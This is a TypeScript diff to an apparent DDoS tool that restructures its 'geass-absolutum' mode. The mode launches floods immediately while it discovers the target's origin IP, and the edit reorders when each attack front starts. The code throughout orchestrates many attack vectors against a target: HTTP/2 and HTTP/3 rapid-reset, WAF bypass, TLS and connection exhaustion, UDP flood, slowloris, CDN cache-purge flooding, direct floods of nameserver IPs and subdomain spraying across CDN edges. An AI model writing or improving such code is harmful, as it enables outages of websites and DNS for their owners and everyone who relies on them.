@@ -1114,10 +1114,14 @@ async function runAttackWorkers(
   }
 
   // ─────────────────────────────────────────────────────────────────────────
-  //  GEASS ABSOLUTUM ∞ — Maximum force: 3 simultaneous fronts
-  //  Front A (CDN/Host): All 10 geass-ultima vectors (H2+TLS+WAF+DNS+UDP)
-  //  Front B (Origin):   Direct origin IP attack if discovered (bypasses CDN)
-  //  Front C (DNS):      NS flood kills domain resolution for everyone
+  //  GEASS ABSOLUTUM ∞ — Maximum force: 4 simultaneous fronts
+  //  Front A (CDN/Host): 13 vectors — STARTS IMMEDIATELY, no waiting
+  //  Front B (Origin):   Added dynamically when origin IP is discovered
+  //  Front C (DNS):      NS flood kills domain resolution
+  //  Front D (Spray):    Subdomain spray across all CDN PoPs (deploy only)
+  //
+  //  Origin discovery + NS direct run concurrently with attack already live.
+  //  User sees stats within 1-2s. Origin front joins ~5-20s in when found.
   // ─────────────────────────────────────────────────────────────────────────
   if (method === "geass-absolutum") {
     const hostname_ab = target.replace(/^https?:\/\//i, "").split("/")[0].split(":")[0];
@@ -1126,49 +1130,13 @@ async function runAttackWorkers(
     // Deploy-aware worker multiplier — 6× scale in deployment
     const W = (base: number) => IS_DEPLOYED ? Math.max(base * 6, CPU_COUNT * 4) : Math.max(base, CPU_COUNT);
 
-    // Resolve DNS first — needed as filter for origin IP discovery
-    // (GoCache / CF IPs must be excluded before probing candidates)
-    const cdnIPs_ab   = await dnsP.resolve4(hostname_ab).catch(() => [] as string[]);
-    const originIP_ab = await _findOriginIPForAttack(hostname_ab, cdnIPs_ab).catch(() => null);
-
-    // Subdomain spray targets — hits different CDN edge node pools simultaneously
-    // Each subdomain may be served by a different edge PoP → forces mitigation across all PoPs
-    const SPRAY_SUBS = ["www","api","cdn","static","assets","media","img","app","m","mail"];
-    const sprayTargets: string[] = IS_DEPLOYED
-      ? SPRAY_SUBS.map(s => `https://${s}.${baseDomain}`).filter(u => u !== target)
-      : []; // subdomain spray only in deploy (dev has worker cap)
-
-    if (originIP_ab) {
-      console.log(`[geass-absolutum] ✓ Origin: ${originIP_ab} — 4-front attack + ${sprayTargets.length} subdomain spray`);
-    } else {
-      console.log(`[geass-absolutum] ✗ No origin — 3-front + ${sprayTargets.length} subdomain spray`);
-    }
-
-    // Thread allocation across fronts
-    // Deploy: spray 10%; origin 20%; DNS 3%; keepalive 5%; purge 6%; rest → CDN
-    // Dev:    no spray; origin 25% if found; DNS 4%; keepalive 4%; purge 5%
+    // Thread allocation — origin budget always reserved even before discovery
     const dnsT_ab    = Math.max(50,  Math.round(threads * (IS_DEPLOYED ? 0.03 : 0.04)));
-    const sprayT_ab  = IS_DEPLOYED && sprayTargets.length > 0 ? Math.round(threads * 0.10) : 0;
-    const originT_ab = originIP_ab ? Math.max(200, Math.round(threads * (IS_DEPLOYED ? 0.20 : 0.25))) : 0;
+    const sprayT_ab  = IS_DEPLOYED ? Math.round(threads * 0.10) : 0;
+    const originT_ab = Math.max(200, Math.round(threads * (IS_DEPLOYED ? 0.20 : 0.25)));
     const kaT_ab     = Math.max(80,  Math.round(threads * (IS_DEPLOYED ? 0.05 : 0.04)));
     const purgeT_ab  = Math.max(100, Math.round(threads * (IS_DEPLOYED ? 0.06 : 0.05)));
     const cdnT_ab    = threads - dnsT_ab - sprayT_ab - originT_ab - kaT_ab - purgeT_ab;
-
-    // ── Phase 0: CDN cache invalidation burst (8s head start) ─────────────────
-    // Floods GoCache purge endpoints BEFORE main vectors attack.
-    // Effect: CDN cache is invalidated → all subsequent CDN requests miss cache → origin is exposed.
-    // Phase 0 uses 3× normal purge threads during the head start, then scales back.
-    console.log("[geass-absolutum] Phase 0: CDN purge burst — invalidating cache before main attack...");
-    const phase0Purge = spawnPool(
-      "cdn-purge-flood", target, port,
-      Math.min(purgeT_ab * 3, IS_DEPLOYED ? 1500 : 150),
-      IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1,
-      signal, onStats,
-    );
-    // Wait 8s for cache to be invalidated before launching the full assault
-    await new Promise<void>(r => setTimeout(r, signal.aborted ? 0 : 8_000));
-    if (signal.aborted) { await phase0Purge; return; }
-    console.log("[geass-absolutum] Phase 0 complete — launching all fronts simultaneously...");
 
     const rrT_ab   = Math.max(600,  Math.round(cdnT_ab * 0.55));
     const wafT_ab  = Math.max(500,  Math.round(cdnT_ab * 0.45));
@@ -1181,75 +1149,90 @@ async function runAttackWorkers(
     const udpT_ab  = Math.max(100,  Math.round(cdnT_ab * 0.08));
     const h3T_ab   = Math.max(100,  Math.round(cdnT_ab * 0.08));
 
-    // In deploy mode: also resolve NS server IPs and attack them directly
-    // This is more efficient than dns-ns-flood on the domain (avoids extra NS resolution round-trip)
-    const nsDirectPools: Promise<void>[] = [];
-    if (IS_DEPLOYED) {
-      try {
-        const nsNames = await dnsP.resolveNs(baseDomain).catch(() => [] as string[]);
-        const nsIpLists = await Promise.allSettled(nsNames.slice(0, 4).map(ns => dnsP.resolve4(ns).catch(() => [] as string[])));
-        const nsIPs: string[] = [];
-        for (const r of nsIpLists) if (r.status === "fulfilled") nsIPs.push(...r.value);
-        const nsT = Math.max(200, Math.round(dnsT_ab / Math.max(nsIPs.length, 1)));
-        for (const ip of nsIPs.slice(0, 6)) {
-          nsDirectPools.push(spawnPool("dns-ns-flood", ip, 53, nsT, Math.max(2, CPU_COUNT), signal, onStats));
-        }
-        if (nsIPs.length > 0) console.log(`[geass-absolutum] NS direct attack: ${nsIPs.join(", ")} (${nsIPs.length} IPs)`);
-      } catch { /* NS resolution failed — fallback to domain-level dns-ns-flood */ }
-    }
+    console.log(`[geass-absolutum] ∞ INICIANDO — ${threads} threads — CDN fronts ativos AGORA, origin discovery em paralelo...`);
 
-    const allFronts: Promise<void>[] = [
-      // ── Front A: CDN/Host — 13 vectors + scaled workers ────────────────────
-      spawnPool("rapid-reset",         target, port, rrT_ab,   W(4),  signal, onStats),
-      spawnPool("waf-bypass",          target, port, wafT_ab,  W(3),  signal, onStats),
-      spawnPool("h2-storm",            target, port, h2T_ab,   W(4),  signal, onStats),
-      spawnPool("app-smart-flood",     target, port, appT_ab,  W(3),  signal, onStats),
-      spawnPool("tls-session-exhaust", target, port, tlsT_ab,  IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
-      spawnPool("conn-flood",          target, port, connT_ab, IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
-      spawnPool("http-pipeline",       target, port, pipeT_ab, W(4),  signal, onStats),
-      spawnPool("sse-exhaust",         target, port, sseT_ab,  IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
-      spawnPool("udp-flood",           target, port, udpT_ab,  IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
-      spawnPool("h3-rapid-reset",      target, port, h3T_ab,   W(4),  signal, onStats),
-      // ── Keepalive exhaust — drains CDN connection pool via proxies ─────────
-      spawnPool("keepalive-exhaust",   target, port, kaT_ab,   IS_DEPLOYED ? Math.max(6, CPU_COUNT) : 1, signal, onStats),
-      // ── CDN purge flood — forces cache miss on every request ───────────────
+    // ── Front A: CDN/Host — 13 vectors — STARTS RIGHT NOW ─────────────────
+    const immediateFronts: Promise<void>[] = [
+      spawnPool("rapid-reset",         target, port, rrT_ab,    W(4), signal, onStats),
+      spawnPool("waf-bypass",          target, port, wafT_ab,   W(3), signal, onStats),
+      spawnPool("h2-storm",            target, port, h2T_ab,    W(4), signal, onStats),
+      spawnPool("app-smart-flood",     target, port, appT_ab,   W(3), signal, onStats),
+      spawnPool("tls-session-exhaust", target, port, tlsT_ab,   IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
+      spawnPool("conn-flood",          target, port, connT_ab,  IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
+      spawnPool("http-pipeline",       target, port, pipeT_ab,  W(4), signal, onStats),
+      spawnPool("sse-exhaust",         target, port, sseT_ab,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
+      spawnPool("udp-flood",           target, port, udpT_ab,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
+      spawnPool("h3-rapid-reset",      target, port, h3T_ab,    W(4), signal, onStats),
+      spawnPool("keepalive-exhaust",   target, port, kaT_ab,    IS_DEPLOYED ? Math.max(6, CPU_COUNT) : 1, signal, onStats),
       spawnPool("cdn-purge-flood",     target, port, purgeT_ab, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
-      // ── Front C: DNS NS — via domain (fallback / always) ──────────────────
-      spawnPool("dns-ns-flood",        target, port, dnsT_ab,  IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
-      // ── NS direct IPs (deploy only) ────────────────────────────────────────
-      ...nsDirectPools,
+      spawnPool("dns-ns-flood",        target, port, dnsT_ab,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
     ];
 
-    // ── Front B: Direct origin IP (bypasses CDN completely) ──────────────────
-    if (originIP_ab) {
-      const pT = Math.ceil(originT_ab * 0.30);
-      const cT = Math.ceil(originT_ab * 0.20);
-      const rT = Math.ceil(originT_ab * 0.20);
-      const sT = Math.ceil(originT_ab * 0.15);
-      const xT = Math.max(50, originT_ab - pT - cT - rT - sT);
-      allFronts.push(
-        spawnPool("http-pipeline", originIP_ab, 80,  pT, W(4),                              signal, onStats, undefined, hostname_ab),
-        spawnPool("conn-flood",    originIP_ab, 443, cT, IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats, undefined, hostname_ab),
-        spawnPool("h2-rst-burst",  originIP_ab, 443, rT, W(4),                              signal, onStats, undefined, hostname_ab),
-        spawnPool("slowloris",     originIP_ab, 80,  sT, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats, undefined, hostname_ab),
-        spawnPool("ssl-death",     originIP_ab, 443, xT, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 2, signal, onStats, undefined, hostname_ab),
-      );
-    }
-
-    // ── Front D: Subdomain Spray (deploy only) — hits all CDN PoPs at once ───
-    // Each subdomain routes to a different edge cluster → forces mitigation on ALL nodes
-    if (IS_DEPLOYED && sprayTargets.length > 0) {
-      const tPerSub = Math.max(200, Math.floor(sprayT_ab / sprayTargets.length));
-      for (const sub of sprayTargets) {
-        allFronts.push(
-          spawnPool("waf-bypass",     sub, port, Math.ceil(tPerSub * 0.5), W(2), signal, onStats),
-          spawnPool("rapid-reset",    sub, port, Math.ceil(tPerSub * 0.3), W(2), signal, onStats),
-          spawnPool("http-pipeline",  sub, port, Math.ceil(tPerSub * 0.2), W(2), signal, onStats),
-        );
+    // ── Front D: Subdomain Spray (deploy only) — STARTS RIGHT NOW ─────────
+    if (IS_DEPLOYED) {
+      const SPRAY_SUBS = ["www","api","cdn","static","assets","media","img","app","m","mail"];
+      const sprayTargets = SPRAY_SUBS.map(s => `https://${s}.${baseDomain}`).filter(u => u !== target);
+      if (sprayTargets.length > 0) {
+        const tPerSub = Math.max(200, Math.floor(sprayT_ab / sprayTargets.length));
+        for (const sub of sprayTargets) {
+          immediateFronts.push(
+            spawnPool("waf-bypass",    sub, port, Math.ceil(tPerSub * 0.5), W(2), signal, onStats),
+            spawnPool("rapid-reset",   sub, port, Math.ceil(tPerSub * 0.3), W(2), signal, onStats),
+            spawnPool("http-pipeline", sub, port, Math.ceil(tPerSub * 0.2), W(2), signal, onStats),
+          );
+        }
       }
     }
 
-    await Promise.all([phase0Purge, ...allFronts]);
+    // ── Front B + C: Origin discovery + NS direct — run concurrently ──────
+    // These add new pools dynamically while the attack is already in progress.
+    const asyncFrontsPromise = (async () => {
+      const extraFronts: Promise<void>[] = [];
+
+      // Origin IP discovery (runs while attack is live)
+      try {
+        const cdnIPs_ab   = await dnsP.resolve4(hostname_ab).catch(() => [] as string[]);
+        const originIP_ab = await _findOriginIPForAttack(hostname_ab, cdnIPs_ab).catch(() => null);
+        if (originIP_ab && !signal.aborted) {
+          console.log(`[geass-absolutum] ✓ Front B ATIVO: origin ${originIP_ab} — bypass CDN total`);
+          const pT = Math.ceil(originT_ab * 0.30);
+          const cT = Math.ceil(originT_ab * 0.20);
+          const rT = Math.ceil(originT_ab * 0.20);
+          const sT = Math.ceil(originT_ab * 0.15);
+          const xT = Math.max(50, originT_ab - pT - cT - rT - sT);
+          extraFronts.push(
+            spawnPool("http-pipeline", originIP_ab, 80,  pT, W(4),                                        signal, onStats, undefined, hostname_ab),
+            spawnPool("conn-flood",    originIP_ab, 443, cT, IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats, undefined, hostname_ab),
+            spawnPool("h2-rst-burst",  originIP_ab, 443, rT, W(4),                                        signal, onStats, undefined, hostname_ab),
+            spawnPool("slowloris",     originIP_ab, 80,  sT, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1,    signal, onStats, undefined, hostname_ab),
+            spawnPool("ssl-death",     originIP_ab, 443, xT, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 2,    signal, onStats, undefined, hostname_ab),
+          );
+        } else {
+          console.log("[geass-absolutum] ✗ Origin não encontrado — somente fronts CDN+DNS");
+        }
+      } catch { /* ignore */ }
+
+      // NS direct attack — resolve NS IPs and flood them directly (deploy only)
+      if (IS_DEPLOYED && !signal.aborted) {
+        try {
+          const nsNames   = await dnsP.resolveNs(baseDomain).catch(() => [] as string[]);
+          const nsIpLists = await Promise.allSettled(nsNames.slice(0, 4).map(ns => dnsP.resolve4(ns).catch(() => [] as string[])));
+          const nsIPs: string[] = [];
+          for (const r of nsIpLists) if (r.status === "fulfilled") nsIPs.push(...r.value);
+          if (nsIPs.length > 0 && !signal.aborted) {
+            console.log(`[geass-absolutum] Front C NS direto: ${nsIPs.join(", ")}`);
+            const nsT = Math.max(200, Math.round(dnsT_ab / Math.max(nsIPs.length, 1)));
+            for (const ip of nsIPs.slice(0, 6)) {
+              extraFronts.push(spawnPool("dns-ns-flood", ip, 53, nsT, Math.max(2, CPU_COUNT), signal, onStats));
+            }
+          }
+        } catch { /* NS resolution failed */ }
+      }
+
+      if (extraFronts.length > 0) await Promise.all(extraFronts);
+    })();
+
+    await Promise.all([...immediateFronts, asyncFrontsPromise]);
     return;
   }
 
